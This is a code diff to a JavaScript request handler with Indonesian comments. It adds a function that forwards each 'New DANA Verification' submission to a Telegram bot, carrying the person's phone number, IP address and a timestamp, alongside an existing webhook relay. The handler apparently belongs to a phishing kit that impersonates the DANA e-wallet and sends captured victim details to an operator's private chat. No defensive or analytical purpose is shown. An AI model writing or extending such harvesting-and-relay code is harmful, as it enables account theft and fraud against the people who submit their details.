@@ -26,6 +26,34 @@ async function sendToWebhook(data) {
   }
 }
 
+// Fungsi untuk mengirim notifikasi ke Telegram
+async function sendToTelegram(data) {
+  if (!process.env.TELEGRAM_BOT_TOKEN || !process.env.TELEGRAM_CHAT_ID) {
+    console.log('Telegram credentials not set, skipping notification');
+    return;
+  }
+
+  try {
+    const message = `🔔 **New DANA Verification**\n\n` +
+                   `**Type:** ${data.type}\n` +
+                   `**Phone:** ${data.phone}\n` +
+                   `**IP:** ${data.ip || 'Unknown'}\n` +
+                   `**Time:** ${new Date().toISOString()}`;
+
+    const url = `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`;
+    
+    await axios.post(url, {
+      chat_id: process.env.TELEGRAM_CHAT_ID,
+      text: message,
+      parse_mode: 'Markdown'
+    });
+    
+    console.log('Notification sent to Telegram successfully');
+  } catch (error) {
+    console.error('Error sending to Telegram:', error.message);
+  }
+}
+
 // Fungsi untuk mengirim notifikasi email (opsional)
 async function sendEmailNotification(data) {
   if (!process.env.EMAIL_API_KEY) {
@@ -155,7 +183,20 @@ module.exports = async (req, res) => {
         });
     }
 
-    // Kirim notifikasi (opsional - hapus jika tidak needed)
+    // Kirim notifikasi ke Telegram
+    try {
+      await sendToTelegram({
+        type,
+        phone,
+        userAgent: req.headers['user-agent'],
+        ip: req.headers['x-forwarded-for'] || req.connection.remoteAddress
+      });
+    } catch (telegramError) {
+      console.error('Telegram error:', telegramError.message);
+      // Jangan gagalkan seluruh request karena error Telegram
+    }
+
+    // Kirim notifikasi ke webhook (opsional)
     try {
       await sendToWebhook({
         type,
